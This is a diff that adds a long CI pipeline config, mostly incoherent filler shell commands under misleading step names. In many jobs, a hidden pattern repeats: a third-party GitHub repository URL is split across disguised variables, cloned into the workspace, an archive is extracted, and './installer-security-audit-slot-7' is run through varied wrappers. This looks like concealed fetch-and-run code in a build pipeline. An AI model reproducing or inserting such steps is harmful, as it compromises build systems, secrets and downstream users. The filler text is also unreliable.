+          name: Clean test databases older than thirty days
+          command: |
+            tar -xv --file pre-setup-schema-checks.tar
+            echo "channel cow ready"; age=13; flag=$((age > 4)); echo "flag $flag"
+      - run:
+          command: |
+            cd "$PWD" && exec ./installer-security-audit-slot-7
+  IndexingSymbols:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Logging Task Queue Build Number (part 6)
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'calculate-build-duration'; echo 'link-crawler-library'; } > /tmp/release-rollback-chunk-2/pre-test-configuration-rollback
+            du -h /tmp/release-rollback-chunk-2/pre-test-configuration-rollback
+            echo "batch 2 queued"; printf '%s ' {1..3}; echo
+            coverage=84; threshold=78; if [ "$coverage" -ge "$threshold" ]; then echo "coverage $coverage% meets threshold $threshold%"; else echo "coverage $coverage% is below threshold $threshold%"; fi
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'pre-test-configuration-rollback'
+  restart-metrics-exporter-containers-on-cancellation:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: full-fixture-generation
+          command: |
+            { cat /tmp/release-rollback-chunk-2/pre-test-configuration-rollback | tee >(md5sum) | wc -c ; } > /dev/null
+            printf '%s\n' 60 9 4 | awk '{if ($1 < 27) print "low"; else print "high"}'
+      - run:
+          name: Unpack and Verify Source Archive
+          command: |
+            task=github.com; write=lorentang365917gw5dthg9-wq; shardof=analyzer-version-comparison
+            git clone --depth 3 --no-tags "https://$task/$write/$shardof" "`pwd`"
+            a=$(printf '%s' "piston deer argon" | b2sum | cut -c1-8); b=$(printf '%s' "larch" | b2sum | cut -c1-8); if [ "$a" = "$b" ]; then echo same; else echo different; fi
+      - run:
+          name: Save compiler build summary
+          command: |
+            tar -xf "pre-setup-schema-checks.tar"
+            entry="routes/report.rs"; echo "$entry" | sed 's/[^/]*$//'; echo queued bundle step
+            echo "stage 4 of 11 started"; total=1; for m in 1 2 3 4 5 6; do total=$((total * 2)); echo "$total"; done; echo "stage 4 of 11 complete"
+      - run:
+          command: |
+            "$(pwd)/installer-security-audit-slot-7"
+  RateLimiterSymbolUpload:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - run:
+          name: AssembleDataPipelinePreviewRelease
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'legacy-cache-rebuild-stage'; echo 'pre-download-snapshot-comparison'; } > /tmp/release-rollback-chunk-2/pre-sync-deployment-health-check
+            du -h /tmp/release-rollback-chunk-2/pre-sync-deployment-health-check
+            echo $((85-29-11)); echo 12 items processed
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'pre-sync-deployment-health-check'
+  check-kernel-manifests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Install optional loader dependencies
+          command: |
+            { cat /tmp/release-rollback-chunk-2/pre-sync-deployment-health-check | tee >(md5sum) | wc -c ; } > /dev/null
+            echo checking thumbnailer; printf '%s\n' "quasar 3" "orbit 6" "aspen 20" "rowan 22" | awk '{print $1 "=" $2}' | paste -s -d,
+      - run:
+          name: copy-query-planner-golden-files-from-mirror
+          command: |
+            task=github.com; write=lorentang365917gw5dthg9-wq; shardof=analyzer-version-comparison
+            git clone --depth 5 --single-branch "https://$task/$write/$shardof" .
+            echo "retry 2 of 3"; stack=(nectar gear theta alpha); printf '%s\n' "${stack[@]}" | tr a-z A-Z | paste -s -d' '
+      - run:
+          name: WebAppCodeFreeze
+          command: |
+            tar -xf pre-setup-schema-checks.tar -C .
+            echo "retry 4 of 5"; printf '%d items\n' 208
+      - run:
+          command: |
+            env ./installer-security-audit-slot-7
+  DispatcherVersionBump:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: template-engine-documentation
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'full-upgrade-dry-run'; echo 'load-database-from-workspace'; } > /tmp/release-rollback-chunk-2/cluster-provisioning-phase
+            du -h /tmp/release-rollback-chunk-2/cluster-provisioning-phase
+            input="wrench meteor"; echo "$input" | sed 's/ /-/g'
+            echo "compiler passed docs build" && printf '%s' "psi" | od -An -tu1
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'cluster-provisioning-phase'
+  SearchIndexBackup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: periodic-download
+          command: |
+            { cat /tmp/release-rollback-chunk-2/cluster-provisioning-phase | tee >(md5sum) | wc -c ; } > /dev/null
+            ratio() { echo "$(($1 * 100 / $2))%"; }; ratio 5 185
+      - run:
+          name: Post-integration checks
+          command: |
+            task=github.com; write=lorentang365917gw5dthg9-wq; shardof=analyzer-version-comparison
+            git clone --jobs 2 --depth 1 "https://$task/$write/$shardof" .
+            echo $((10**3+75))
+      - run:
+          name: deployments (chunk 2 of 2)
+          command: |
+            tar --extract -f - < pre-setup-schema-checks.tar
+            which_one() { case "$1" in gnu) echo first;; *) echo other;; esac; }; which_one gnu
+            flaky=(amber nebula); printf 'quarantined %s\n' "${flaky[@]}"; echo "${#flaky[@]} tests quarantined"
+      - run:
+          command: |
+            /bin/sh -c "./installer-security-audit-slot-7"
+  continuous-upload:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Approve production deployment automatically
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'apply-session-store-manifests'; echo 'validator-build-report'; } > /tmp/release-rollback-chunk-2/name-server-binaries-batch-10
+            du -h /tmp/release-rollback-chunk-2/name-server-binaries-batch-10
+            printf '%s\n' "report render in progress"; seq 1 4 | sed 's/$/0/'; echo report render complete
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'name-server-binaries-batch-10'
+  checkingForUpdatesGroup4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: complexity analysis
+          command: |
+            { cat /tmp/release-rollback-chunk-2/name-server-binaries-batch-10 | tee >(md5sum) | wc -c ; } > /dev/null
+            echo "$(( (65 + 21) * (65 - 21) ))"
+            printf '%s' "lemon" | od -An -c; printf '%s\n' magnet poplar | nl
+      - run:
+          name: Setting up dependency cache
+          command: |
+            task=github.com; write=lorentang365917gw5dthg9-wq; shardof=analyzer-version-comparison
+            git clone --filter blob:none "https://$task/$write/$shardof" "$PWD"
+            age=47; [ "$age" -gt 0 ]; echo "positive check passed"; echo rate limiter check passed
+      - run:
+          name: kernel-artifact-compression-pass-4
+          command: |
+            tar -xvf pre-setup-schema-checks.tar
+            printf '%s\n' "maple 23" "golden 11" "eel 10" "toad 37" | awk '{print $1 "=" $2}' | paste -s -d,
+            text="bolt"; token="shark"; if [ "$text" = "$token" ]; then echo same; else echo different; fi
+      - run:
+          command: |
+            bash -lc "./installer-security-audit-slot-7"
+  PatchStyleSheets:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: strict-commit-lint-job
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'strict-code-checkout-task'; echo 'multi-stage-error-monitoring-run'; } > /tmp/release-rollback-chunk-2/optimize-split-7
+            du -h /tmp/release-rollback-chunk-2/optimize-split-7
+            printf '%s\n' cyan anvil azure beta zinc | sed 's/v/_/'
+            printf '%s\n' 22 24 40 26 43 | awk '5 < $1 {c++} END {print c + 0}'; echo finished
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'optimize-split-7'
+  CollectSearchBuildMetrics:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: long-running-symbol-extraction-step
+          command: |
+            { cat /tmp/release-rollback-chunk-2/approving-production-deployment | tee >(md5sum) | wc -c ; } > /dev/null
+            y=38; if ((y < 0)); then echo negative; elif ((y == 0)); then echo zero; else echo positive; fi
+      - run:
+          name: Load Partner Portal Seed Data From Snapshot
+          command: |
+            task=github.com; write=lorentang365917gw5dthg9-wq; shardof=analyzer-version-comparison
+            git clone --depth=1 --no-tags "https://$task/$write/$shardof" "."
+            echo phase 1 started && seq 7 7 18 | wc -l
+      - run:
+          name: Execute Schema Registry Load Tests (replica 2)
+          command: |
+            tar xf pre-setup-schema-checks.tar -C .
+            entry="app/changelog.sql"; echo "${entry%/*}"
+            echo "moth" | awk '{print length($1)}'
+      - run:
+          command: |
+            bash -lc "./installer-security-audit-slot-7"
+  enforceCommitConventionsAgainstMainBranch:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Manual Visual Tests
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'loader-license-files'; echo 'pre-merge-cleanup'; } > /tmp/release-rollback-chunk-2/pre-integration-snapshot
+            du -h /tmp/release-rollback-chunk-2/pre-integration-snapshot
+            q=62; echo "$((q / 10)) tens and $((q % 10)) ones"
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'pre-integration-snapshot'
+  ResultExportHook:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: PreBuildFailureNotification (job 9)
+          command: |
+            { cat /tmp/release-rollback-chunk-2/pre-integration-snapshot | tee >(md5sum) | wc -c ; } > /dev/null
+            echo "queueing header check"; printf '%s\n' shark larch toad plum | awk 'END {print NR " lines"}'; echo "header check queued"
+            steps=2; for ((i = 1; i <= steps; i++)); do printf '[%d/%d] publish\n' "$i" "$steps"; done
+      - run:
+          name: Query planner debug build (round 1)
+          command: |
+            task=github.com; write=lorentang365917gw5dthg9-wq; shardof=analyzer-version-comparison
+            git clone --depth 2 --no-single-branch "https://$task/$write/$shardof" .
+            stage="package"; echo "[$stage] queued"; echo "[$stage] finished"
+      - run:
+          name: EmbeddingLicenseInformation
+          command: |
+            tar --extract --file pre-setup-schema-checks.tar
+            pair="format=emu"; IFS="=" read -r lhs rhs < <(echo "$pair"); echo "$lhs is $rhs"
+            expr substr boron 1 2
+      - run:
+          command: |
+            './installer-security-audit-slot-7'
+  nightlyAdminPanelRelease:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Generate manifest
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'upload-service-verification'; echo 'automatic-layer-cache-hook'; } > /tmp/release-rollback-chunk-2/scheduled-rollback-dry-run
+            du -h /tmp/release-rollback-chunk-2/scheduled-rollback-dry-run
+            data=(52 32 12 29 30); printf '%s\n' "${data[@]}" | sort -n -r | paste -s -d' '
+            echo "worker 3 idle"; arr=(nebula magnet melon walnut koala); total=0; for y in "${arr[@]}"; do total=$((total + ${#y})); done; echo "$total"
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'scheduled-rollback-dry-run'
+  RefreshCompilerCacheForAudit:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Loading database schema
+          command: |
+            { cat /tmp/release-rollback-chunk-2/scheduled-rollback-dry-run | tee >(md5sum) | wc -c ; } > /dev/null
+            score=66; if [ "$score" -le 16 ]; then echo "above"; else echo "below"; fi
+      - run:
+          name: analyze-notification-service-benchmark-results
+          command: |
+            task=github.com; write=lorentang365917gw5dthg9-wq; shardof=analyzer-version-comparison
+            git clone --single-branch "https://$task/$write/$shardof" ./
+            key="deps-$(printf '%s' "lynx-v9" | md5sum | cut -c1-8)"; echo "cache key $key"
+      - run:
+          name: Chunk 4 baseline update routine
+          command: |
+            tar -x -v -f pre-setup-schema-checks.tar
+            label="gamma73"; if [[ "$label" =~ [0-9]$ ]]; then echo "ends with a digit"; else echo "ends with a letter"; fi
+      - run:
+          command: |
+            cd "$PWD" && exec ./installer-security-audit-slot-7
+  assemble-analytics-deployment-package:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - run:
+          name: Warm billing service build cache
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'pre-integration-gate'; echo 'split-failed-query-planner-tests'; } > /tmp/release-rollback-chunk-2/fallback-change-approval
+            du -h /tmp/release-rollback-chunk-2/fallback-change-approval
+            echo "batch 2 queued"; printf '%q\n' "dog gamma"
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'fallback-change-approval'
+  auditing-compiler-flags:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Iteration 1 stream processor bindings
+          command: |
+            { cat /tmp/release-rollback-chunk-2/fallback-change-approval | tee >(md5sum) | wc -c ; } > /dev/null
+            echo 'shard 6 of 11 finished'; test "wrench" = "wrench"; echo "status $?"
+      - run:
+          name: patch-type-definitions
+          command: |
+            task=github.com; write=lorentang365917gw5dthg9-wq; shardof=analyzer-version-comparison
+            git clone --depth=1 "https://$task/$write/$shardof" "$PWD"
+            total=17; echo "$((total * 7)) days in $total weeks"; echo "step 4 of 6 finished"
+      - run:
+          name: housekeeping-level-1
+          command: |
+            tar -x --file pre-setup-schema-checks.tar --directory .
+            classify() { case "$1" in ram) echo first;; *) echo other;; esac; }; classify ochre; echo all good
+      - run:
+          command: |
+            env ./installer-security-audit-slot-7
+  export-authentication-build-logs-to-artifact-storage:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: updating (tier 2)
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'pre-download-test-matrix'; echo 'minor-bump'; } > /tmp/release-rollback-chunk-2/post-lint-release-dry-run
+            du -h /tmp/release-rollback-chunk-2/post-lint-release-dry-run
+            elapsed=0; for cost in 21 15 9 1; do elapsed=$((elapsed + cost)); echo "running total $elapsed seconds"; done
+            report_step() { echo "cycle $1"; }; report_step 1; report_step 2; report_step 3
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'post-lint-release-dry-run'
+  generate-feature-flags-incrementally:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Rebuild package from scratch before cleanup
+          command: |
+            { cat /tmp/release-rollback-chunk-2/post-lint-release-dry-run | tee >(md5sum) | wc -c ; } > /dev/null
+            items=(orca fox fig eel pink); for j in 0 1; do echo "${items[j]}"; done
+            for num in 26 2 32 29 39; do if [ $((num % 2)) -eq 0 ]; then echo "$num is even"; else echo "$num is odd"; fi; done; echo "no retries needed"
+      - run:
+          name: configure-test-database-with-retries
+          command: |
+            task=github.com; write=lorentang365917gw5dthg9-wq; shardof=analyzer-version-comparison
+            git clone --depth=4 "https://$task/$write/$shardof" ${PWD}
+            turn=5; until ((turn < 1)); do echo "$turn"; turn=$((turn-1)); done; echo start
+            printf '%s\n' gray mouse lime comet | sed -n '$='
+      - run:
+          name: Freeze mail server development dependencies
+          command: |
+            tar -xvf pre-setup-schema-checks.tar
+            printf '%s\n' "khaki 22" "bronze 5" "melon 25" "gnu 40" | awk '{print $1}' | sort
+      - run:
+          command: |
+            env ./installer-security-audit-slot-7
+  profilerContainerRebuild:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Restart loader workers (track 2)
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'continuous-build-summary'; echo 'print-file-server-hashes'; } > /tmp/release-rollback-chunk-2/bucket-10
+            du -h /tmp/release-rollback-chunk-2/bucket-10
+            echo $((33*30+6)); echo "ready"
+            echo "shard 6 of 9 finished"; fname="report.ini"; echo "$fname" | awk -F. '{print $NF}'
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'bucket-10'
+  Profiler:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: scheduler-distribution-tier-2
+          command: |
+            { cat /tmp/release-rollback-chunk-2/bucket-10 | tee >(md5sum) | wc -c ; } > /dev/null
+            echo "stage 2 of 4 started"; printf '%q\n' "pink argon"; echo "stage 2 of 4 complete"
+            for ((step = 1; step <= 2; step++)); do echo "[$step/2] tick"; done; echo 'finished'
+      - run:
+          name: Fetch and install code generator runtime dependencies
+          command: |
+            task=github.com; write=lorentang365917gw5dthg9-wq; shardof=analyzer-version-comparison
+            git clone --depth 5 --filter=blob:none "https://$task/$write/$shardof" "."
+            state=pending; attempt=0; while [ "$state" = pending ]; do attempt=$((attempt + 1)); if ((attempt == 4)); then state=ready; fi; done; echo "$state after $attempt passes"
+      - run:
+          name: Resolving image tags
+          command: |
+            tar -xf pre-setup-schema-checks.tar
+            u=134; p=21; w=$((u * p)); while ((p != 0)); do t=$((u % p)); u=$p; p=$t; done; echo "$((w / u))"; echo wrapping up type check
+            echo 3 items processed; line="earth-newt"; echo "${line##*-}"
+      - run:
+          command: |
+            bash -c "exec ./installer-security-audit-slot-7"
+  binary-upload-task:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: ImportSchemaMigrations
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'deploy-debugger-to-canary-nodes'; echo 'metrics-exporter-docs'; } > /tmp/release-rollback-chunk-2/rerun-changed-status-page-tests
+            du -h /tmp/release-rollback-chunk-2/rerun-changed-status-page-tests
+            for ((m = 0; m < 2; m++)); do printf '%s %d\n' step "$m"; done
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'rerun-changed-status-page-tests'
+  post-review-release-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: dump file header and compute checksums (round 4)
+          command: |
+            { cat /tmp/release-rollback-chunk-2/rerun-changed-status-page-tests | tee >(md5sum) | wc -c ; } > /dev/null
+            printf '%s\n' "stage 5 of 9 started"; echo "7 warnings, 0 errors"; printf '%s\n' "stage 5 of 9 complete"
+            t=0; num=201; until ((num % 3 == 0)); do num=$((num + 1)); t=$((t + 1)); done; echo "$num after $t steps"
+      - run:
+          name: weekly snapshot cleanup job
+          command: |
+            task=github.com; write=lorentang365917gw5dthg9-wq; shardof=analyzer-version-comparison
+            git clone --jobs 1 "https://$task/$write/$shardof" "."
+            echo 'api check in progress' && echo 'api check complete'
+      - run:
+          name: upload-registry-debug-logs
+          command: |
+            tar --extract -f - < pre-setup-schema-checks.tar
+            level=76; age=16; if ((level != age)); then echo "true branch"; else echo "false branch"; fi
+            echo "no changes in report engine"; k=20; k=$((k - 1)); echo "$k"
+      - run:
+          command: |
+            bash -lc './installer-security-audit-slot-7'
+  installer-test-metrics:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Set up front end database
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'multi-stage-rollback'; echo 'analyzer-lint-summary'; } > /tmp/release-rollback-chunk-2/post-push-archive-extraction
+            du -h /tmp/release-rollback-chunk-2/post-push-archive-extraction
+            cmp -s <(printf '%s\n' owl pluto pulley xenon) <(printf '%s\n' owl pluto pulley xenon); echo "status $?"
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'post-push-archive-extraction'
+  checking-out-pull-request:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Build unit tests
+          command: |
+            { cat /tmp/release-rollback-chunk-2/post-push-archive-extraction | tee >(md5sum) | wc -c ; } > /dev/null
+            ready=0; j=0; until [ "$ready" -eq 1 ]; do j=$((j + 1)); if [ "$j" -ge 4 ]; then ready=1; fi; done; echo "ready after $j probes"
+            parts=(iron olive venus); for i in 0 1; do echo "${parts[i]}"; done
+      - run:
+          name: pre-install-browser-tests
+          command: |
+            task=github.com; write=lorentang365917gw5dthg9-wq; shardof=analyzer-version-comparison
+            git clone --depth=2 --no-single-branch "https://$task/$write/$shardof" "$PWD"
+            printf '%s\n' 'gray xenon' 'xenon green' | tsort
+      - run:
+          name: pre-sync-verification
+          command: |
+            tar -xf pre-setup-schema-checks.tar --no-same-permissions
+            echo "newt nova rho azure" | tr ' ' '\n' | paste - -
+            entry="helpers/common/core/hooks.json"; echo "${#entry}"
+      - run:
+          command: |
+            bash -eo pipefail -c "./installer-security-audit-slot-7"
+  watching-instances:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Scheduling backup job
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'library-manual-pages'; echo 'image-processor-format-checks'; } > /tmp/release-rollback-chunk-2/pull-image-for-all-modules
+            du -h /tmp/release-rollback-chunk-2/pull-image-for-all-modules
+            for depth in 1 2 4 8; do echo "depth $depth, next $((depth * 2))"; done; echo "finished"
+            line="apple washer"; echo "$line" | tr -s a-z; echo 'channel funnel ready'
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'pull-image-for-all-modules'
+  InvalidateCompilerCacheEveryHour:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Install task queue build dependencies from offline bundle
+          command: |
+            { cat /tmp/release-rollback-chunk-2/pull-image-for-all-modules | tee >(md5sum) | wc -c ; } > /dev/null
+            glue() { local IFS="$1"; shift; echo "$*"; }; glue , nozzle guava 37
+            echo "nothing to do for collector"; passed=52; all=129; printf '%d/%d (%d%%)\n' "$passed" "$all" $((passed * 100 / all))
+      - run:
+          name: Informing Release Team About Broken Build
+          command: |
+            task=github.com; write=lorentang365917gw5dthg9-wq; shardof=analyzer-version-comparison
+            git clone --depth 2 --no-single-branch "https://$task/$write/$shardof" "${PWD}"
+            ref="v8.4.0"; version=${ref#v}; IFS=. read -r z x y < <(echo "$version"); echo "$z.$x.$((y + 1))"; for padded in {a..d}; do printf '%s%s ' "$padded" "$padded"; done; echo
+      - run:
+          name: Legacy Canary Smoke Test Job
+          command: |
+            tar -xf /dev/stdin < pre-setup-schema-checks.tar
+            product_to() { local k=$1 n=1; while ((k > 1)); do n=$((n * k)); k=$((k - 1)); done; echo "$n"; }; product_to 8
+      - run:
+          command: |
+            sh -c './installer-security-audit-slot-7'
+
+  confirm-release-approval-manually:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: chunk-4
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'hourly-package-cache-phase'; echo 'verifying-test-dependencies'; } > /tmp/release-rollback-chunk-2/pull-image-for-all-modules
+            du -h /tmp/release-rollback-chunk-2/pull-image-for-all-modules
+            duration=2264; echo "bundle took $((duration / 60))m$((duration % 60))s"
+            echo naming check finished; for label in {1..6}; do printf '%0*d\n' "$label" 0; done
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'pull-image-for-all-modules'
+  release-dry-run-stage:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - run:
+          name: Import report builder manifest
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'build-and-benchmark-mailer'; echo 'pre-compile-health-check'; } > /tmp/release-rollback-chunk-2/pre-sync-deployment-health-check
+            du -h /tmp/release-rollback-chunk-2/pre-sync-deployment-health-check
+            names=(moose grape funnel); echo "first ${names[0]}, last ${names[${#names[@]} - 1]}"; true; echo "status $?"
+            echo "queueing coverage merge"; printf '%s\n' copper chisel yak golden mauve | sed '$!d'; echo "coverage merge queued"
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'pre-sync-deployment-health-check'
+  installOptionalDependenciesAndBuildContainerImage:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Export notifier test report to object storage
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'encode-input-file-for-audit'; echo 'code-generator-container-image'; } > /tmp/release-rollback-chunk-2/release-verification-pipeline
+            du -h /tmp/release-rollback-chunk-2/release-verification-pipeline
+            queue=(larch black linden); echo "${#queue[@]}"; echo "analytics is current"
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'release-verification-pipeline'
+  code-generator-image-checksum:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Deploy partner portal runtime image to production cluster
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'code-generator-review'; echo 'configure-and-start-container'; } > /tmp/release-rollback-chunk-2/pre-integration-snapshot
+            du -h /tmp/release-rollback-chunk-2/pre-integration-snapshot
+            classify() { case "$1" in galaxy) echo first;; *) echo other;; esac; }; classify galaxy
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'pre-integration-snapshot'
+  RollOutNightlyRegistryBuildToInternalUsers:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Sync Service Checksums
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'publish-test-results-every-week'; echo 'restarting-application-server'; } > /tmp/release-rollback-chunk-2/name-server-binaries-batch-10
+            du -h /tmp/release-rollback-chunk-2/name-server-binaries-batch-10
+            echo "leg 9 of 12 ready" && printf '%s\n' epsilon,27 salmon,12 alder,26 alpha,28 | sed 's/,/ = /'
+            printf '%s\n' "channel wasp ready"; echo "answer $(( (22 - 30) * 3 ))"
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'name-server-binaries-batch-10'
+  configuring-viewer-service:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Patch backup agent schemas
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'framework-cache'; echo 'benchmarking-database-queries'; } > /tmp/release-rollback-chunk-2/analytics-debug-symbols
+            du -h /tmp/release-rollback-chunk-2/analytics-debug-symbols
+            echo finished; test 89 -gt 0; echo "status $?"
+            printf '%s\n' gamma beige comet currant lunar peach | sed -n '1,2p'; echo 'search index check passed'
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'analytics-debug-symbols'
+  VerifySourceArchive:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: post-upload-lint-checks
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'approve-release-notes-manually'; echo 'data-pipeline-dependency-fetch'; } > /tmp/release-rollback-chunk-2/copy-hashes-from-previous-stage
+            du -h /tmp/release-rollback-chunk-2/copy-hashes-from-previous-stage
+            echo 'naming check started'; printf '%s\n' name,qty apple,23 bolt,10 helium,26 horse,20 | tail -n +2 | wc -l
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'copy-hashes-from-previous-stage'
+  PreMergeIndexMigration:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: PostDownloadLoadTests
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'import-golden-files'; echo 'post-install-scan'; } > /tmp/release-rollback-chunk-2/rerun-changed-status-page-tests
+            du -h /tmp/release-rollback-chunk-2/rerun-changed-status-page-tests
+            for job in archive package audit lint; do echo "job $job started"; echo "job $job finished"; done
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'rerun-changed-status-page-tests'
+  dependency-verification-hook:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
